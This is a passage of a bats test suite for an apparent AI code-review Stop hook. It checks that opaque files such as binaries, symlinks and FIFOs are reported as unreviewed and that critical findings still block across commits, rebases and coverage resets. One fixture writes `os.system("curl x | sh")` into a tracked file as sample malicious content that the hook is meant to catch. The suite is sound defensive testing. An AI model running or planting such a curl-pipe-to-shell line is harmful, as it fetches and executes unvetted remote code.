    jq -e '.diff | contains("alpha.py") and (contains("archive.bin") | not)' "$B10_D2_STATE/payload" >/dev/null || return 1
    b10_d2_no_completion || return 1
  done
}

@test "B10 D2 M1: individual opaque exclusions never mask critical text or mint completion" {
  local harness kind expected before expect_exclusion
  for harness in claude codex; do
    for kind in image symlink fifo tracked-binary unknown-binary; do
      b10_d2_fixture "$harness" "-$kind"
      expect_exclusion=1
      case "$kind" in
        image) printf '\000opaque' > "$B10_D2_PROJECT/shot.png" ;;
        symlink) printf secret > "$B10_D2_STATE/outside-target"; ln -s "$B10_D2_STATE/outside-target" "$B10_D2_PROJECT/link" ;;
        fifo)
          mkfifo "$B10_D2_PROJECT/pipe"
          # Git may omit unsupported special files entirely. Such a FIFO
          # is never a review input; still prove that text criticals block.
          if ! "$B10_D2_REAL_GIT" -C "$B10_D2_PROJECT" ls-files --others --exclude-standard -- pipe | grep -Fxq pipe; then
            expect_exclusion=0
          fi ;;
        tracked-binary)
          printf '\000before' > "$B10_D2_PROJECT/tracked.dat"
          git -C "$B10_D2_PROJECT" add tracked.dat
          git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm binary
          printf '\000after' > "$B10_D2_PROJECT/tracked.dat" ;;
        unknown-binary) printf '\000opaque' > "$B10_D2_PROJECT/unknown.dat" ;;
      esac
      cat > "$B10_D2_TOOLS/reviewer" <<'CRITICAL_REVIEWER'
#!/bin/sh
printf 'call\n' >> "$B10_D2_STATE/calls"
cat > "$B10_D2_STATE/payload"
printf '%s\n' '{"status":"completed","findings":[{"severity":"critical","file":"alpha.py","msg":"critical despite excluded asset"}]}'
CRITICAL_REVIEWER
      chmod +x "$B10_D2_TOOLS/reviewer"
      before=$(git -C "$B10_D2_PROJECT" status --porcelain=v1)
      if [ "$harness" = claude ]; then expected=2; else expected=0; fi
      b10_d2_review
      [ "$status" -eq "$expected" ] || return 1
      printf '%s' "$output" | jq -e '.decision == "block" and (.reason | contains("critical despite excluded asset"))' >/dev/null || return 1
      if [ "$expect_exclusion" -eq 1 ]; then
        [[ "$stderr" == *excluded*UNREVIEWED* ]] || { printf 'harness=%s kind=%s stdout=%s stderr=%s\n' "$harness" "$kind" "$output" "$stderr" >&2; return 1; }
        jq -e '(.excluded_paths | length) > 0' "$B10_D2_STATE/payload" >/dev/null || { printf 'missing exclusion: %s/%s\n' "$harness" "$kind" >&2; return 1; }
      fi
      jq -e '.diff | contains("alpha.py")' "$B10_D2_STATE/payload" >/dev/null || return 1
      b10_d2_no_completion || return 1
      b10_d2_review
      [ "$status" -eq "$expected" ] || return 1
      printf '%s' "$output" | jq -e '.decision == "block"' >/dev/null || return 1
      if [ "$expect_exclusion" -eq 1 ]; then expected=1; else expected=2; fi
      [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq "$expected" ] || return 1
      [ "$before" = "$(git -C "$B10_D2_PROJECT" status --porcelain=v1)" ] || return 1
      b10_d2_no_completion || return 1
    done
  done
}

@test "B10 D2 M1: advisory findings and exclusions share one valid Stop output object" {
  local harness
  for harness in claude codex; do
    b10_d2_fixture "$harness"
    printf '\000opaque' > "$B10_D2_PROJECT/shot.png"
    cat > "$B10_D2_TOOLS/reviewer" <<'ADVISORY_REVIEWER'
#!/bin/sh
printf 'call\n' >> "$B10_D2_STATE/calls"
cat > "$B10_D2_STATE/payload"
printf '%s\n' '{"status":"completed","findings":[{"severity":"minor","file":"alpha.py","msg":"minor text advice stays visible"}]}'
ADVISORY_REVIEWER
    chmod +x "$B10_D2_TOOLS/reviewer"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    printf '%s' "$output" | jq -se 'length == 1 and (.[0] | (.additionalContext // .systemMessage) | contains("minor text advice stays visible") and contains("UNREVIEWED") and contains("shot.png"))' >/dev/null || return 1
    [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 1 ] || return 1
    b10_d2_no_completion || return 1
  done
}

@test "B10 D2 N1: an opaque-only change reuses text coverage but never completes its capture" {
  local harness record previous
  for harness in claude codex; do
    b10_d2_fixture "$harness"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    record=$(find "$B10_D2_STATE" -name "reviewed.$harness" -type f -print -quit)
    [ -n "$record" ] || return 1
    previous=$(cat "$record")
    printf '\000opaque' > "$B10_D2_PROJECT/shot.png"
    cat > "$B10_D2_TOOLS/reviewer" <<'CACHED_CRITICAL_REVIEWER'
#!/bin/sh
printf 'call\n' >> "$B10_D2_STATE/calls"
cat > "$B10_D2_STATE/payload"
printf '%s\n' '{"status":"completed","findings":[{"severity":"critical","file":"alpha.py","msg":"critical despite cached text tree"}]}'
CACHED_CRITICAL_REVIEWER
    chmod +x "$B10_D2_TOOLS/reviewer"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    printf '%s' "$output" | jq -se 'length == 1 and (.[0] | (.additionalContext // .systemMessage) | contains("UNREVIEWED") and contains("shot.png"))' >/dev/null || return 1
    [[ "$stderr" == *excluded*UNREVIEWED* ]] || return 1
    [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 1 ] || return 1
    [ "$previous" = "$(cat "$record")" ] || return 1
    record=$(find "$B10_D2_STATE" -name "capture.$harness.json" -type f -print -quit)
    jq -e '.incomplete == true and .coverage_accepted == true and (.excluded | index("shot.png") != null)' "$record" >/dev/null || return 1
  done
}

@test "B10 D2 N1: three unchanged incomplete Stops call the clean reviewer exactly once" {
  local harness n record
  for harness in claude codex; do
    b10_d2_fixture "$harness"
    printf '\000png' > "$B10_D2_PROJECT/shot.png"
    for n in 1 2 3; do
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      [[ "$stderr" == *UNREVIEWED* ]] || return 1
      [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 1 ] || return 1
      b10_d2_no_completion || return 1
    done
    record=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
    jq -e '.incomplete == true and .coverage_accepted == true
      and (.reviewed_files | index("alpha.py") != null)
      and (.excluded | index("shot.png") != null)' "$record" >/dev/null || return 1
  done
}

@test "B10 D2 N2: committed binaries advance text coverage before cumulative diffs exceed 200000 bytes" {
  local harness n first record last
  for harness in claude codex; do
    b10_d2_fixture "$harness"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    record=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
    first=$(jq -r '.tree' "$record")
    printf '\000png' > "$B10_D2_PROJECT/logo.png"
    git -C "$B10_D2_PROJECT" add -- alpha.py beta.py gamma.py logo.png
    git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm binary-and-code
    for n in 1 2; do
      "$B10_D2_REAL_PYTHON" -I - "$B10_D2_PROJECT" "$n" <<'GROWTH'
from pathlib import Path
import sys
for name in ('alpha.py', 'beta.py', 'gamma.py'):
    with (Path(sys.argv[1]) / name).open('a') as f:
        for i in range(1600): f.write('r%s-%05d: %s\n' % (sys.argv[2], i, 'x' * 15))
GROWTH
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq "$((n + 1))" ] || return 1
      if [ "$n" -eq 1 ]; then
        [[ "$stderr" == *UNREVIEWED* ]] || return 1
      else
        jq -e '(.diff | contains("+r2-") and (contains("+r1-") | not) and (contains("logo.png") | not))
          and .excluded_paths == []' "$B10_D2_STATE/payload" >/dev/null || return 1
      fi
      git -C "$B10_D2_PROJECT" add -- alpha.py beta.py gamma.py
      git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm "round-$n"
    done
    last=$(jq -r '.tree' "$record")
    [ "$(git -C "$B10_D2_PROJECT" diff "$first" "$last" -- | wc -c | tr -d ' ')" -gt 200000 ] || return 1
    jq -e '.incomplete == false and .coverage_accepted == true' "$record" >/dev/null || return 1
  done
}

@test "B10 D2 R4 M-1: shadow index preserves racy same-size text and opaque edits" {
  local harness name
  for harness in claude codex; do
    for name in racy.py racy.dat; do
      b10_d2_fixture "$harness" "-$name"
      git -C "$B10_D2_PROJECT" config core.trustctime false
      git -C "$B10_D2_PROJECT" config core.checkStat minimal
      if [ "$name" = racy.py ]; then printf 'safe=1\n' > "$B10_D2_PROJECT/$name"
      else printf '\000before' > "$B10_D2_PROJECT/$name"; fi
      "$B10_D2_REAL_PYTHON" -I -c 'import os,sys; os.utime(sys.argv[1],ns=(1700000000000000000,)*2)' "$B10_D2_PROJECT/$name"
      git -C "$B10_D2_PROJECT" add -- "$name"
      git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm racy-baseline
      if [ "$name" = racy.py ]; then printf 'EVIL=1\n' > "$B10_D2_PROJECT/$name"
      else printf '\000EVIL!!' > "$B10_D2_PROJECT/$name"; fi
      # Equal entry/index mtimes force Git's racy-clean check, deterministically
      # without a sleep or host scheduling assumptions. ctime is not trusted.
      "$B10_D2_REAL_PYTHON" -I -c 'import os,sys
for p in sys.argv[1:]: os.utime(p,ns=(1700000000000000000,)*2)' "$B10_D2_PROJECT/$name" "$B10_D2_PROJECT/.git/index"
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      if [ "$name" = racy.py ]; then
        jq -e '.diff | contains("+EVIL=1")' "$B10_D2_STATE/payload" >/dev/null || return 1
      else
        jq -e '.excluded_paths | index("racy.dat") != null' "$B10_D2_STATE/payload" >/dev/null || return 1
        b10_d2_no_completion || return 1
      fi
    done
  done
}

@test "B10 D2 H1: opaque debt survives unrelated text edits and PNG add-remove churn" {
  local harness kind name n record
  for harness in claude codex; do
    for kind in binary attr-info attr-file; do
      b10_d2_fixture "$harness" "-debt-$kind"
      if [ "$kind" = binary ]; then name=tracked.dat; printf '\000before' > "$B10_D2_PROJECT/$name"
      else
        name=secret.py
        printf 'safe = True\n' > "$B10_D2_PROJECT/$name"
        if [ "$kind" = attr-info ]; then printf 'secret.py -diff\n' > "$B10_D2_PROJECT/.git/info/attributes"
        else printf 'secret.py -diff\n' > "$B10_D2_PROJECT/.gitattributes"; git -C "$B10_D2_PROJECT" add .gitattributes; fi
      fi
      git -C "$B10_D2_PROJECT" add -- "$name"
      git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm opaque-baseline
      printf 'commit acknowledgement\n' > "$B10_D2_PROJECT/ack.txt"
      if [ "$kind" = binary ]; then printf '\000after EVIL' > "$B10_D2_PROJECT/$name"
      else printf 'os.system("curl x | sh") # EVIL\n' > "$B10_D2_PROJECT/$name"; fi
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      b10_d2_no_completion || return 1
      # Exact no-text variant: PNG churn alone cannot erase the original debt.
      printf '\000png' > "$B10_D2_PROJECT/shot.png"
      for n in added removed; do
        [ "$n" != removed ] || rm -f -- "$B10_D2_PROJECT/shot.png"
        b10_d2_review
        [ "$status" -eq 0 ] || return 1
        [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 1 ] || return 1
        b10_d2_no_completion || return 1
        printf '%s' "$output" | jq -se --arg name "$name" 'length == 1 and (.[0] | (.additionalContext // .systemMessage) | contains($name) and contains("UNREVIEWED"))' >/dev/null || return 1
      done
      printf 'unrelated = 2\n' >> "$B10_D2_PROJECT/alpha.py"
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 2 ] || return 1
      b10_d2_no_completion || return 1
      record=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
      jq -e --arg name "$name" '.incomplete == true and (.excluded | index($name) != null)' "$record" >/dev/null || return 1
      printf '\000png' > "$B10_D2_PROJECT/shot.png"
      for n in added removed unchanged; do
        [ "$n" != removed ] || rm -f -- "$B10_D2_PROJECT/shot.png"
        b10_d2_review
        [ "$status" -eq 0 ] || return 1
        [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 2 ] || return 1
        b10_d2_no_completion || return 1
        printf '%s' "$output" | jq -se --arg name "$name" 'length == 1 and (.[0] | (.additionalContext // .systemMessage) | contains("UNREVIEWED") and contains($name))' >/dev/null || return 1
      done
      jq -e '.diff | contains("EVIL") | not' "$B10_D2_STATE/payload" >/dev/null || return 1
      # Commit only already-reviewed text: the opaque bytes are still dirty.
      git -C "$B10_D2_PROJECT" add ack.txt
      git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm unrelated
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 2 ] || return 1
      b10_d2_no_completion || return 1
      printf '%s' "$output" | jq -se --arg name "$name" 'length == 1 and (.[0] | (.additionalContext // .systemMessage) | contains($name) and contains("UNREVIEWED"))' >/dev/null || return 1
      # A later commit containing the exact announced blob is an acknowledgement.
      git -C "$B10_D2_PROJECT" add -- "$name"
      git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm acknowledged-opaque
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 2 ] || return 1
      jq -e '.incomplete == false and .opaque == []' "$record" >/dev/null || return 1
    done
  done
}

@test "B10 D2 H1: deletion and exact reversion retire debt while changed opaque blobs are re-announced without model calls" {
  local harness kind record
  for harness in claude codex; do
    for kind in deleted reverted changed changed-commit; do
      b10_d2_fixture "$harness" "-retire-$kind"
      printf '\000before' > "$B10_D2_PROJECT/tracked.dat"
      git -C "$B10_D2_PROJECT" add tracked.dat
      git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm baseline
      printf '\000EVIL-one' > "$B10_D2_PROJECT/tracked.dat"
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      b10_d2_no_completion || return 1
      case "$kind" in
        deleted) rm -f -- "$B10_D2_PROJECT/tracked.dat" ;;
        reverted) printf '\000before' > "$B10_D2_PROJECT/tracked.dat" ;;
        changed) printf '\000EVIL-two' > "$B10_D2_PROJECT/tracked.dat" ;;
        changed-commit)
          printf '\000EVIL-two' > "$B10_D2_PROJECT/tracked.dat"
          git -C "$B10_D2_PROJECT" add tracked.dat
          git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm different-blob-before-notice ;;
      esac
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 1 ] || return 1
      record=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
      if [ "$kind" = changed ] || [ "$kind" = changed-commit ]; then
        jq -e '.incomplete == true and (.opaque | length) == 1' "$record" >/dev/null || return 1
        printf '%s' "$output" | jq -se 'length == 1 and (.[0] | (.additionalContext // .systemMessage) | contains("tracked.dat") and contains("UNREVIEWED"))' >/dev/null || return 1
      else jq -e '.incomplete == false and .opaque == []' "$record" >/dev/null || return 1; fi
      b10_d2_no_completion || return 1
      if [ "$kind" = changed-commit ]; then
        # The new blob was committed BEFORE its notice. A text edit at the
        # same HEAD must not discharge it using the previous announcement.
        printf 'unrelated = 3\n' >> "$B10_D2_PROJECT/alpha.py"
        b10_d2_review
        [ "$status" -eq 0 ] || return 1
        [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 2 ] || return 1
        jq -e '.incomplete == true and (.opaque | length) == 1' "$record" >/dev/null || return 1
        b10_d2_no_completion || return 1
      fi
    done
  done
}

@test "B10 D2 H1: a blob committed before its notice retires only at a subsequent matching HEAD" {
  local harness record completed before
  for harness in claude codex; do
    b10_d2_fixture "$harness" -precommitted
    printf '\000before' > "$B10_D2_PROJECT/tracked.dat"
    git -C "$B10_D2_PROJECT" add tracked.dat
    git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm baseline
    printf 'acknowledge later\n' > "$B10_D2_PROJECT/ack.txt"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    completed=$(find "$B10_D2_STATE" -name "reviewed.$harness" -type f -print -quit)
    before=$(cat "$completed")
    printf '\000already-committed' > "$B10_D2_PROJECT/tracked.dat"
    git -C "$B10_D2_PROJECT" add tracked.dat
    git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm before-notice
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 1 ] || return 1
    record=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
    jq -e '.incomplete == true and (.opaque | length) == 1' "$record" >/dev/null || return 1
    [ "$before" = "$(cat "$completed")" ] || return 1
    b10_d2_review
    jq -e '.incomplete == true' "$record" >/dev/null || return 1
    printf '%s' "$output" | jq -se 'length == 1 and (.[0] | (.additionalContext // .systemMessage) | contains("UNREVIEWED"))' >/dev/null || return 1
    printf 'text at same HEAD\n' >> "$B10_D2_PROJECT/alpha.py"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 2 ] || return 1
    jq -e '.incomplete == true and (.opaque | length) == 1' "$record" >/dev/null || return 1
    [ "$before" = "$(cat "$completed")" ] || return 1
    git -C "$B10_D2_PROJECT" add ack.txt
    git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm after-notice
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    jq -e '.incomplete == false and .opaque == []' "$record" >/dev/null || return 1
    [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 2 ] || return 1
    [ "$before" = "$(cat "$completed")" ] || return 1
  done
}

@test "B10 D2 R4 L-a: context changes and reset coverage never discard announced opaque debt" {
  local harness kind record capture completed before tmp n
  for harness in claude codex; do
    for kind in autonomy completion-ref missing invalid invalid-shape missing-all; do
      b10_d2_fixture "$harness" "-context-$kind"
      b10_d2_review
      completed=$(find "$B10_D2_STATE" -name "reviewed.$harness" -type f -print -quit)
      printf '\000committed-before-notice' > "$B10_D2_PROJECT/tracked.dat"
      git -C "$B10_D2_PROJECT" add tracked.dat
      git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm precommitted-opaque
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      record=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
      capture="${record%/*}/capture.$harness.json"
      case "$kind" in
        autonomy) mkdir -p "$B10_D2_PROJECT/.claude"; printf '2\n' > "$B10_D2_PROJECT/.claude/session-autonomy" ;;
        completion-ref) printf '%s %s invalidated\n' "$(git -C "$B10_D2_PROJECT" rev-parse HEAD)" "$(git -C "$B10_D2_PROJECT" rev-parse 'HEAD^{tree}')" > "$completed" ;;
        missing) rm -f -- "$record" ;;
        invalid) tmp="$record.tmp"; jq '.tree = "0123456789012345678901234567890123456789"' "$record" > "$tmp"; mv "$tmp" "$record" ;;
        invalid-shape) tmp="$record.tmp"; jq '.reviewed_files = null' "$record" > "$tmp"; mv "$tmp" "$record" ;;
        missing-all) rm -f -- "$record" "$capture" ;;
      esac
      before=$(cat "$completed")
      printf 'unrelated = 7\n' >> "$B10_D2_PROJECT/alpha.py"
      for n in 1 2; do
        b10_d2_review
        [ "$status" -eq 0 ] || return 1
        if [ "$kind" = missing-all ]; then
          # R5 ruling: absent records never arm a hold. With both debt
          # sources deliberately deleted, only a full HEAD review is known.
          jq -e '.incomplete == false and .reset_hold == false' "$record" >/dev/null || return 1
          continue
        fi
        [ "$before" = "$(cat "$completed")" ] || return 1
        printf '%s' "$output" | jq -se 'length == 1 and (.[0] | (.additionalContext // .systemMessage) | contains("UNREVIEWED"))' >/dev/null || return 1
        jq -e '.incomplete == true' "$record" >/dev/null || return 1
        if [ "$kind" = missing ]; then jq -e '.reset_hold == false' "$record" >/dev/null || return 1; fi
        case "$kind" in
          missing|invalid|invalid-shape|missing-all)
            [ "$n" -ne 1 ] || printf '%s' "$output" | jq -se '.[0] | (.additionalContext // .systemMessage) | contains("coverage record was reset")' >/dev/null || { printf '%s/%s/%s: %s\n' "$harness" "$kind" "$n" "$output" >&3; return 1; } ;;
        esac
        if [ "$kind" != missing-all ]; then
          jq -e '.opaque | map(.path) | index("tracked.dat") != null' "$record" >/dev/null || return 1
        fi
      done
      # A reset must suppress even an otherwise legitimate retirement in that
      # Stop; the surviving capture is debt recovery, never a coverage base.
      if [ "$kind" = missing ] || [ "$kind" = invalid ]; then
        printf 'acknowledgement\n' >> "$B10_D2_PROJECT/alpha.py"
        git -C "$B10_D2_PROJECT" add alpha.py
        git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm later-head
        printf 'new = 1\n' > "$B10_D2_PROJECT/delta.py"
        rm -f -- "$record"
        b10_d2_review
        [ "$status" -eq 0 ] || return 1
        jq -e '.incomplete == true and (.opaque | length) == 1' "$record" >/dev/null || return 1
        [ "$before" = "$(cat "$completed")" ] || return 1
      fi
    done
  done
}

@test "B10 D2 R5 H-1: history rewrites and legacy upgrade remain completable with and without opaque debt" {
  local harness kind binary record completed
  for harness in claude codex; do
    for kind in amend reset branch rebase upgrade; do
      for binary in no yes; do
        b10_d2_fixture "$harness" "-history-$kind-$binary"
        if [ "$binary" = yes ]; then
          printf '\000before' > "$B10_D2_PROJECT/tracked.dat"
          git -C "$B10_D2_PROJECT" add tracked.dat
        fi
        git -C "$B10_D2_PROJECT" add alpha.py beta.py gamma.py
        git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm tracked-baseline
        printf 'history\n' > "$B10_D2_PROJECT/history.txt"
        git -C "$B10_D2_PROJECT" add history.txt
        GIT_COMMITTER_DATE='2000-01-01T00:00:00Z' git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm prior-head
        printf 'a = 2\n' >> "$B10_D2_PROJECT/alpha.py"
        printf 'b = 2\n' >> "$B10_D2_PROJECT/beta.py"
        printf 'c = 2\n' >> "$B10_D2_PROJECT/gamma.py"
        b10_d2_review
        [ "$status" -eq 0 ] || return 1
        completed=$(find "$B10_D2_STATE" -name "reviewed.$harness" -type f -print -quit)
        record="${completed%/*}/covered.$harness.json"
        if [ "$binary" = yes ]; then
          printf '\000EVIL-dirty' > "$B10_D2_PROJECT/tracked.dat"
          b10_d2_review
          [ "$status" -eq 0 ] || return 1
          jq -e '.incomplete == true' "$record" >/dev/null || return 1
        fi
        case "$kind" in
          amend) git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit --amend --allow-empty -qm rewritten-head ;;
          reset) git -C "$B10_D2_PROJECT" reset --soft HEAD~1 >/dev/null ;;
          branch) git -C "$B10_D2_PROJECT" checkout -q -b other HEAD~1 ;;
          rebase)
            git -C "$B10_D2_PROJECT" add alpha.py beta.py gamma.py
            git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm reviewed-text
            if [ "$binary" = yes ]; then git -C "$B10_D2_PROJECT" restore tracked.dat; fi
            GIT_COMMITTER_DATE='2030-01-01T00:00:00Z' git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com rebase --force-rebase HEAD~2 >/dev/null 2>&1
            [ "$binary" != yes ] || printf '\000EVIL-dirty' > "$B10_D2_PROJECT/tracked.dat" ;;
          upgrade) rm -f -- "$record" "${record%/*}/capture.$harness.json" ;;
        esac
        printf 'a = 3\n' >> "$B10_D2_PROJECT/alpha.py"
        printf 'b = 3\n' >> "$B10_D2_PROJECT/beta.py"
        printf 'c = 3\n' >> "$B10_D2_PROJECT/gamma.py"
        b10_d2_review
        [ "$status" -eq 0 ] || return 1
        if [ "$binary" = yes ]; then
          jq -e '.incomplete == true and (.opaque | map(.path) | index("tracked.dat") != null)' "$record" >/dev/null || return 1
          git -C "$B10_D2_PROJECT" add tracked.dat
          git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm acknowledged-opaque
          printf 'a = 4\n' >> "$B10_D2_PROJECT/alpha.py"
          b10_d2_review
          [ "$status" -eq 0 ] || return 1
        else
          # R8 announces an unproved switch/rebase once, then a clean
          # unchanged recapture becomes completable without upstream blame.
          b10_d2_review
          [ "$status" -eq 0 ] || return 1
        fi
        jq -e '.incomplete == false and .opaque == [] and .reset_hold == false' "$record" >/dev/null || { printf '%s/%s/%s: %s\n' "$harness" "$kind" "$binary" "$output" >&3; return 1; }
        # An empty recapture clears the announcement but does not invent a
        # review marker. A subsequent real text delta must publish completion.
        printf 'final_review = 4\n' >> "$B10_D2_PROJECT/alpha.py"
        b10_d2_review
        [ "$status" -eq 0 ] || return 1
        printf '%s' "$(cat "$completed")" | grep -q "$(git -C "$B10_D2_PROJECT" rev-parse HEAD)" || return 1
      done
    done
  done
}

@test "B10 D2 R5 H-1: an invalid coverage hold clears on the next unchanged clean recapture" {
  local harness record calls_before
  for harness in claude codex; do
    b10_d2_fixture "$harness" -temporary-hold
    b10_d2_review
    record=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
    printf '{invalid\n' > "$record"
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    jq -e '.incomplete == true and .reset_hold == true and .coverage_reset == true' "$record" >/dev/null || return 1
    calls_before=$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')
    b10_d2_review
    [ "$status" -eq 0 ] || return 1
    jq -e '.incomplete == false and .reset_hold == false and .coverage_reset == false' "$record" >/dev/null || return 1
    [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq "$calls_before" ] || return 1
  done
}

@test "B10 D2 R5 L-e: a first block-only capture permits deletion and history recovery without a reset" {
  local harness kind record
  for harness in claude codex; do
    for kind in fix amend; do
      b10_d2_fixture "$harness" "-first-block-$kind"
      printf '\000opaque' > "$B10_D2_PROJECT/blob.dat"
      git -C "$B10_D2_PROJECT" add blob.dat
      cat > "$B10_D2_TOOLS/reviewer" <<'FIRST_BLOCK'
#!/bin/bash
printf 'call\n' >> "$B10_D2_STATE/calls"
cat > "$B10_D2_STATE/payload"
printf '%s\n' '{"status":"completed","findings":[{"severity":"critical","file":"alpha.py","msg":"critical"}]}'
FIRST_BLOCK
      b10_d2_review
      if [ "$harness" = claude ]; then [ "$status" -eq 2 ] || return 1
      else [ "$status" -eq 0 ] || return 1; fi
      git -C "$B10_D2_PROJECT" rm -qf blob.dat
      if [ "$kind" = amend ]; then git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit --amend --allow-empty -qm new-root; fi
      cat > "$B10_D2_TOOLS/reviewer" <<'NOW_CLEAN'
#!/bin/bash
printf 'call\n' >> "$B10_D2_STATE/calls"
cat > "$B10_D2_STATE/payload"
printf '%s\n' '{"status":"completed","findings":[]}'
NOW_CLEAN
      printf 'fixed = 1\n' >> "$B10_D2_PROJECT/alpha.py"
      b10_d2_review
      [ "$status" -eq 0 ] || return 1
      record=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
      jq -e '.incomplete == false and .reset_hold == false and .coverage_reset == false and .opaque == []' "$record" >/dev/null || return 1
      [ "$(wc -l < "$B10_D2_STATE/calls" | tr -d ' ')" -eq 2 ] || return 1
    done
  done
}

@test "B10 D2 R4 L-b: 9000 new or saved opaque entries use one aggregate notice and no per-entry Git calls" {
  local harness kind n record before calls_before count
  for harness in claude codex; do
    for kind in new-delta union-ledger saved-ledger; do
      b10_d2_fixture "$harness" "-cap-$kind"
      if [ "$kind" != saved-ledger ]; then
        count=9000
        [ "$kind" != union-ledger ] || count=256
        "$B10_D2_REAL_PYTHON" -I - "$B10_D2_PROJECT" before "$count" <<'OPAQUE_FILES'
from pathlib import Path
import sys
for n in range(int(sys.argv[3])): (Path(sys.argv[1]) / ('b%04d.dat' % n)).write_bytes(b'\0' + sys.argv[2].encode())
OPAQUE_FILES
        git -C "$B10_D2_PROJECT" add -- '*.dat'
        git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm many-binary-baselines
        "$B10_D2_REAL_PYTHON" -I - "$B10_D2_PROJECT" after "$count" <<'OPAQUE_FILES'
from pathlib import Path
import sys
for n in range(int(sys.argv[3])): (Path(sys.argv[1]) / ('b%04d.dat' % n)).write_bytes(b'\0' + sys.argv[2].encode())
OPAQUE_FILES
        calls_before=0
        if [ "$kind" = union-ledger ]; then
          b10_d2_review
          [ "$status" -eq 0 ] || return 1
          record=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
          jq -e '.incomplete == true and (.opaque | length) == 256' "$record" >/dev/null || return 1
          before=$("$B10_D2_REAL_GIT" hash-object "$record")
          printf '\000new' > "$B10_D2_PROJECT/one-more.dat"
          git -C "$B10_D2_PROJECT" add one-more.dat
          calls_before=1
        fi
      else
        printf '\000before' > "$B10_D2_PROJECT/tracked.dat"
        git -C "$B10_D2_PROJECT" add tracked.dat
        git -C "$B10_D2_PROJECT" -c user.name=test -c user.email=test@example.com commit -qm one-binary
        printf '\000after' > "$B10_D2_PROJECT/tracked.dat"
        b10_d2_review
        [ "$status" -eq 0 ] || return 1
        record=$(find "$B10_D2_STATE" -name "covered.$harness.json" -type f -print -quit)
        "$B10_D2_REAL_PYTHON" -I - "$record" "$harness" <<'LARGE_LEDGER'
import json, pathlib, sys
p = pathlib.Path(sys.argv[1])
r = json.loads(p.read_text())
old = r['opaque'][0]
r['opaque'] = [dict(old, path='b%04d.dat' % n, path_hex=('b%04d.dat' % n).encode().hex()) for n in range(9000)]
for q in (p, p.with_name('capture.' + sys.argv[2] + '.json')): q.write_text(json.dumps(r))
LARGE_LEDGER
        before=$("$B10_D2_REAL_GIT" hash-object "$record")
        calls_before=1
      fi
